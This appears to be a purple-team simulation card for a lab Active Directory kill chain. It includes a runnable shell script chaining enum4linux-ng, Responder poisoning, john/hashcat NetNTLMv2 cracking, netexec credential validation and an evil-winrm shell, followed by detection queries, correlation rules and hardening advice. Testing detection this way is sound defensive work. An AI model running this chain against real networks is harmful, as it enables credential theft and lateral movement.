identity.name: Internal AD Kill-Chain: Poisoning → Offline Crack → Credential Validation → WinRM Lateral (SIM-ITDR-015)
identity.summary: A connected internal AD kill-chain against the itdr lab: enum4linux-ng/smbmap enumerate, Responder captures a NetNTLMv2 hash, john/hashcat crack it offline, netexec validates the credential, evil-winrm lands a WinRM shell — one causality graph from a single recon-shell CGO, detected across NDR/ITDR/EDR and stitched by CR-ITDR-0015.
identity.description: This card backs SIM-ITDR-015, a full internal-network Active Directory kill-chain that a Domain Consultant runs against the CortexSim itdr Terraform lab (Domain Controller + workstations with seeded roastable/lab accounts) to prove Cortex detection coverage across the credential-access-to-lateral-movement arc. The chain is deliberately CONNECTED rather than a set of isolated tests: a single operator recon shell on the attacker foothold (the CGO) forks every tool, so each stage inherits the same causality lineage / source identity. Stage 1 (discovery): enum4linux-ng performs SAMR/LSARPC directory enumeration and smbmap maps SMB shares and permissions against the DC — a same-source RPC/LDAP fan-out the NGFW/NDR sees and a directory-object read burst the Windows Security log records. Stage 2 (credential access): Responder answers LLMNR (UDP 5355) and NBT-NS (UDP 137) broadcast name queries for names it does not own and captures the resulting NetNTLMv2 authentication — an ABIOC anchored on the learned per-host name-resolution baseline flags the rogue responder, and a validation XQL confirms inbound NetNTLMv2 to the attacker host. Stage 3 (offline crack): john and hashcat crack the captured NetNTLMv2 hash locally on the foothold — pure CPU/GPU work invisible to the network but visible to EDR as a cracking-tool process whose causality_actor_process lineage roots in the same recon shell. Stage 4 (validation): netexec (nxc) replays the cracked domain credential across the lab subnet, producing single-account network logons that fan out across multiple hosts from the attacker IP. Stage 5 (lateral movement): evil-winrm opens a WinRM session and lands an interactive shell, observed as wsmprovhost.exe spawning cmd/powershell on the target — the endpoint_network_stitch payoff. A correlation rule (CR-ITDR-0015) fuses the poisoning capture, the offline crack, the credential validation, and the WinRM landing — all tied to one source_ip / recon-shell CGO — into a single incident, proving Cortex both sees each stage and reconstructs the whole chain. SAFE-MODE: Responder runs in analyze/observe posture, the credential is a seeded lab account, the WinRM step runs only a benign whoami, and every target is the itdr lab (${CORTEXSIM_DC_TARGET}/${CORTEXSIM_AD_TARGET}); nothing is destructive.

actors.name: Internal-network intrusion operators and ransomware affiliates using the classic Responder → offline-crack → lateral-WinRM playbook

campaigns: Generic internal Active Directory compromise (LLMNR/NBT-NS poisoning to lateral movement)

techniques.name: Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay

execution.framework_reference_id: SIM-ITDR-015 — Internal AD kill-chain (enum4linux-ng/smbmap → Responder → john/hashcat → netexec → evil-winrm) against the itdr IaC lab

prerequisites.description: itdr IaC module applied so the Domain Controller (${CORTEXSIM_DC_TARGET}) and workstations with seeded lab accounts are reachable on the lab subnet.
Cortex XDR/XSIAM agents on the domain hosts and NGFW/NDR ingesting traffic logs for the lab subnet.
Launch consent (simulation_authorized) granted — every tool in this chain is a dual-use-lab-only adapter gated by the orchestrator adapter-consent check.
prerequisites.check_command: echo "consent.simulation_authorized must be true at launch"

payload.code:
# SAFE-MODE internal AD kill-chain against the itdr lab ONLY. Responder runs in
# analyze posture; the credential is a seeded lab account; WinRM runs a benign whoami.
set -uo pipefail
DC="${CORTEXSIM_DC_TARGET:-127.0.0.1}"
TGT="${CORTEXSIM_AD_TARGET:-127.0.0.1}"
IFACE="${CORTEXSIM_RESPONDER_IFACE:-eth0}"
WL="${CORTEXSIM_WORDLIST:-/usr/share/wordlists/rockyou.txt}"
USER="${CORTEXSIM_AD_USER:-svc-lab}"
PASS="${CORTEXSIM_AD_PASS:-LabPassw0rd!}"
enum4linux-ng -A "$DC" -oJ /tmp/cortexsim-itdr-015-enum4linux || true
smbmap -H "$DC" -u guest -p '' || true
responder -I "$IFACE" -A | tee /tmp/cortexsim-itdr-015-responder.log || true
john --format=netntlmv2 --wordlist="$WL" /tmp/cortexsim-itdr-015-netntlmv2.txt || true
hashcat -m 5600 -a 0 /tmp/cortexsim-itdr-015-netntlmv2.txt "$WL" --potfile-path=/tmp/cortexsim-itdr-015-hashcat.pot --quiet || true
nxc smb "$TGT" -u "$USER" -p "$PASS" || true
echo 'whoami; hostname; exit' | evil-winrm -i "$TGT" -u "$USER" -p "$PASS" || true

input_variables.name: CORTEXSIM_RESPONDER_IFACE

expected_artifacts.description: Single-source SMB/RPC/LDAP fan-out (dst_port 135/139/389/445/636) to the DC from the attacker foothold (enum4linux-ng/smbmap).
Inbound NetNTLMv2 authentication to the attacker host after LLMNR/NBT-NS name responses (Responder capture).
Offline cracking-tool process (john/hashcat) on the foothold whose causality_actor_process roots in the recon shell.
expected_artifacts.expected_value: action_process_image_name in (john, hashcat) and causality_actor_process_image_name in (bash, zsh, sh, responder)

iocs.context: Default WSMan/HTTP user-agent emitted by evil-winrm on the lateral WinRM session to the domain host.
Responder session/capture log written on the attacker foothold when LLMNR/NBT-NS name queries are logged and NetNTLMv2 material is captured.

biocs.name: ITDR-015 Null-Session Directory Enumeration Against Domain Controller
biocs.description: A single source host issues a burst of SAMR/LSARPC directory-object reads against a Domain Controller (users, groups, domain policy) consistent with enum4linux-ng AD enumeration. The CGO here is the operator recon shell on the attacker foothold; this is the opening move of the kill chain.
biocs.logic:
dataset = msft_windows_security
| filter event_id in (4661, 4662) and object_type in ("SAM_USER", "SAM_GROUP", "SAM_DOMAIN")
| comp count() as dir_reads, count_distinct(object_name) as objects by ip_address, account_name
| filter objects >= 10
| fields ip_address, account_name, dir_reads, objects

biocs.name: ITDR-015 SMB Share Enumeration And Permission Mapping
biocs.description: A single source enumerates many SMB shares and maps their read/write permissions on the lab file/DC hosts (smbmap), a share-discovery burst that widens the attacker's picture of reachable data before credential capture.
biocs.logic:
dataset = msft_windows_security
| filter event_id in (5140, 5145)
| comp count_distinct(share_name) as shares, count() as accesses by ip_address, account_name
| filter shares >= 5
| fields ip_address, account_name, shares, accesses

biocs.name: ITDR-015 Offline Credential-Cracking Tool Execution With Recon-Shell Lineage
biocs.description: An offline password-cracking binary (john or hashcat) executes on the attacker foothold with its causality actor rooted in the operator recon shell (or the responder capture process) — the offline-crack leg of the chain. Keying on causality_actor_process_command_line ties the crack to the same lineage that ran the enumeration and poisoning.
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name in ("john", "hashcat")
| filter causality_actor_process_image_name in ("bash", "zsh", "sh", "responder")
| fields agent_hostname, actor_effective_username, causality_actor_process_command_line, causality_actor_process_image_name, action_process_image_name

biocs.name: ITDR-015 Compromised-Account Authentication From Attacker Foothold
biocs.description: The cracked domain credential is replayed from the attacker foothold IP, producing successful network logons across two or more distinct domain hosts in a short window (netexec validation spray). Same-source, single-account fan-out across hosts is the credential-validation signature bridging the crack to lateral movement.
biocs.logic:
dataset = msft_windows_security
| filter event_id = 4624 and logon_type = 3
| comp count_distinct(computer_name) as hosts, count() as logons by ip_address, account_name
| filter hosts >= 2
| fields ip_address, account_name, hosts, logons

biocs.name: ITDR-015 WinRM Lateral Movement Landing Remote Shell
biocs.description: A WinRM service host (wsmprovhost.exe) spawns an interactive shell (cmd.exe/powershell.exe) on a domain host — the endpoint-side landing of an evil-winrm lateral session. causality_actor_process_image_name = wsmprovhost.exe is the stitch between the inbound WinRM network session and the remote shell it lands.
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter causality_actor_process_image_name = "wsmprovhost.exe"
| filter action_process_image_name in ("cmd.exe", "powershell.exe", "conhost.exe")
| fields agent_hostname, causality_actor_process_command_line, action_process_image_name

abiocs.name: ITDR-015 Rogue LLMNR And NBT-NS Responder With NetNTLMv2 Capture
abiocs.description: A host on the segment begins authoritatively answering LLMNR (UDP 5355) and NBT-NS (UDP 137) broadcast name queries for names it has never legitimately owned, then receives inbound NetNTLMv2 authentication — the behavioral signature of a rogue Responder poisoning names to harvest hashes. The ABIOC anchors on the learned per-host name-resolution baseline: the responder host deviates by suddenly resolving a spike of distinct names.
abiocs.logic:
dataset = xdr_data
| filter event_type = ENUM.NETWORK
| filter action_local_port in (137, 5355) or action_remote_port in (137, 5355)
| comp count() as name_responses, count_distinct(dns_query_name) as names by agent_hostname, action_local_ip
| filter name_responses >= 10 and names >= 5
| fields agent_hostname, action_local_ip, name_responses, names
abiocs.causality_anchor: Learned per-host name-resolution baseline (which hosts legitimately answer LLMNR/NBT-NS and for which names); the rogue responder deviates by authoritatively answering a spike of distinct names it never previously owned and drawing inbound NetNTLMv2 auth.

xql_queries.name: ITDR-015 SMB RPC LDAP Enumeration Fan-Out To Domain Controller
xql_queries.query:
dataset = panw_ngfw_traffic_raw
| filter _time > to_timestamp(current_time() - 1800)
| filter flow_direction = "inbound" and dst_port in (135, 139, 389, 445, 636)
| comp count() as conns, count_distinct(dst_port) as ports by src_ip, dst_ip
| filter ports >= 3 and conns >= 20
| sort desc conns
| fields src_ip, dst_ip, ports, conns

xql_queries.name: ITDR-015 SMB Share-Enumeration Fan-Out From Single Source
xql_queries.query:
dataset = msft_windows_security
| filter _time > to_timestamp(current_time() - 1800)
| filter event_id = 5140
| comp count_distinct(share_name) as shares, count() as accesses by ip_address, account_name
| filter shares >= 5
| sort desc shares
| fields ip_address, account_name, shares, accesses

xql_queries.name: ITDR-015 Inbound NetNTLMv2 Authentication To Rogue Responder Host
xql_queries.query:
dataset = panw_ngfw_traffic_raw
| filter _time > to_timestamp(current_time() - 1800)
| filter dst_port in (137, 139, 445, 5355)
| comp count() as sessions, count_distinct(src_ip) as victims by dst_ip
| filter victims >= 1 and sessions >= 1
| sort desc sessions
| fields dst_ip, victims, sessions

xql_queries.name: ITDR-015 Offline Cracking-Tool Process With Recon-Shell Causality
xql_queries.query:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name in ("john", "hashcat")
| filter causality_actor_process_image_name in ("bash", "zsh", "sh", "responder")
| comp count() as crack_procs by agent_hostname, actor_effective_username, causality_actor_process_image_name, action_process_image_name
| filter crack_procs >= 1
| fields agent_hostname, actor_effective_username, causality_actor_process_image_name, action_process_image_name, crack_procs

xql_queries.name: ITDR-015 Compromised-Account Validation Across Domain Hosts
xql_queries.query:
dataset = msft_windows_security
| filter _time > to_timestamp(current_time() - 1800)
| filter event_id in (4624, 4625) and logon_type = 3
| comp count_distinct(computer_name) as hosts, count() as attempts by ip_address, account_name
| filter hosts >= 2
| sort desc hosts
| fields ip_address, account_name, hosts, attempts

xql_queries.name: ITDR-015 WinRM Remote-Shell Session Landing On Domain Host
xql_queries.query:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter causality_actor_process_image_name = "wsmprovhost.exe"
| filter action_process_image_name in ("cmd.exe", "powershell.exe", "conhost.exe")
| comp count() as shells by agent_hostname, causality_actor_process_image_name, action_process_image_name
| filter shells >= 1
| fields agent_hostname, causality_actor_process_image_name, action_process_image_name, shells

correlation_rules.name: Internal AD Kill-Chain — Enumerate To Poison To Crack To Validate To Lateral WinRM
correlation_rules.logic: XQL(ITDR-015 Inbound NetNTLMv2 Authentication To Rogue Responder Host) AND XQL(ITDR-015 Offline Cracking-Tool Process With Recon-Shell Causality) AND (XQL(ITDR-015 Compromised-Account Validation Across Domain Hosts) OR BIOC(ITDR-015 Compromised-Account Authentication From Attacker Foothold)) AND (XQL(ITDR-015 WinRM Remote-Shell Session Landing On Domain Host) OR BIOC(ITDR-015 WinRM Lateral Movement Landing Remote Shell)) — stitches the LLMNR/NBT-NS poisoning capture, the offline NetNTLMv2 crack on the attacker foothold, the cracked-credential validation across domain hosts, and the WinRM lateral landing into one credential-access-to-lateral-movement incident, all tied to a single attacker source_ip / recon-shell CGO.

analytics_modules: Cortex XSIAM ITDR — LLMNR/NBT-NS poisoning + NetNTLMv2 capture behavioral analytics
Cortex XDR — offline credential-cracking process causality + WinRM lateral-movement detection
Cortex NGFW/NDR — internal SMB/RPC/LDAP enumeration fan-out and rogue-responder inbound-auth telemetry

products.evidence_query: dataset = xdr_data | filter event_type = ENUM.NETWORK | filter action_local_port in (137, 5355) | comp count_distinct(dns_query_name) as names by agent_hostname, action_local_ip | filter names >= 5

dataset = xdr_data | filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START | filter action_process_image_name in ("john", "hashcat") or causality_actor_process_image_name = "wsmprovhost.exe" | fields agent_hostname, causality_actor_process_image_name, action_process_image_name
dataset = panw_ngfw_traffic_raw | filter dst_port in (135, 139, 389, 445, 636) and flow_direction = "inbound" | comp count_distinct(dst_port) as ports by src_ip, dst_ip | filter ports >= 3
Correlation CR-ITDR-0015 stitches the poisoning capture, offline crack, credential validation, and WinRM lateral landing from one source_ip / recon-shell CGO into a single incident.

threat_scenarios.name: Internal AD Kill-Chain Detection — Poisoning to Offline Crack to WinRM Lateral Movement
threat_scenarios.description: Cortex detects each stage of a connected internal AD compromise (enumeration, LLMNR/NBT-NS poisoning + NetNTLMv2 capture, offline crack, credential validation, WinRM lateral movement) and correlates them into one incident tied to a single attacker foothold.

threat_steps.objective: Cortex detects the LLMNR/NBT-NS poisoning and NetNTLMv2 capture and flags the offline crack whose causality roots in the recon-shell CGO.
preconditions: itdr IaC lab applied (DC + workstations, seeded lab account).
Cortex agents on domain hosts + NDR ingesting lab-subnet traffic.
Launch consent (simulation_authorized) granted for the dual-use adapters.
steps: Run SIM-ITDR-015 enumeration + Responder + john/hashcat stages.
Observe the rogue-responder ABIOC, the inbound-NetNTLMv2 XQL, and the offline-crack process detection.
success_criteria: ABIOC `ITDR-015 Rogue LLMNR And NBT-NS Responder With NetNTLMv2 Capture` fires.
BIOC `ITDR-015 Offline Credential-Cracking Tool Execution With Recon-Shell Lineage` fires with causality_actor_process lineage populated.

threat_steps.objective: Cortex detects the cracked-credential validation and the WinRM lateral landing and correlates the full chain into one incident.
preconditions: Preceding stages executed so a cracked lab credential is available.
steps: Run the netexec validation + evil-winrm lateral stages against the lab subnet.
Observe the credential-validation fan-out and the wsmprovhost.exe shell landing, then CR-ITDR-0015 escalation.
success_criteria: Compromised-account validation XQL returns >= 1 single-account, multi-host row.
BIOC `ITDR-015 WinRM Lateral Movement Landing Remote Shell` fires.
Correlation CR-ITDR-0015 raises one incident stitching poisoning + crack + validation + lateral.

preventive_controls: Disable LLMNR (Group Policy: Turn off multicast name resolution) and NBT-NS on all endpoints to eliminate the poisoning surface.
Enforce SMB signing and require Kerberos to blunt NetNTLMv2 relay/capture value.
Enforce long/complex service-account passwords (or gMSA) so captured NetNTLMv2 hashes are not offline-crackable in feasible time.
Restrict WinRM (5985/5986) to management jump hosts and require just-in-time admin, so a validated credential cannot pivot laterally.
detection_engineering: Alert on any host authoritatively answering LLMNR/NBT-NS for names outside its learned baseline, and on inbound NetNTLMv2 auth to non-server hosts.
Alert on offline cracking-tool processes (john/hashcat) with a recon-shell causality lineage on non-sanctioned hosts.
Alert on a single account authenticating (logon_type 3) across multiple hosts from one source IP within a short window.
Stitch poisoning capture → offline crack → credential validation → WinRM landing into one credential-access-to-lateral-movement incident.

changelog.author: Henry Reed
changelog.change: Promoted SIM-ITDR-015 internal AD kill-chain card from scaffold to active. Real NDR/ITDR/EDR detection logic across the enum4linux-ng/smbmap → Responder → john/hashcat → netexec → evil-winrm chain: rogue-responder ABIOC, 5 BIOCs, 6 validation XQL (SMB/RPC/LDAP fan-out, share enum, inbound NetNTLMv2, offline-crack causality, credential validation, WinRM landing), correlation CR-ITDR-0015, 2 IOCs, and full PANW/UC-TC mapping. Connected-causality chain from a single recon-shell CGO.
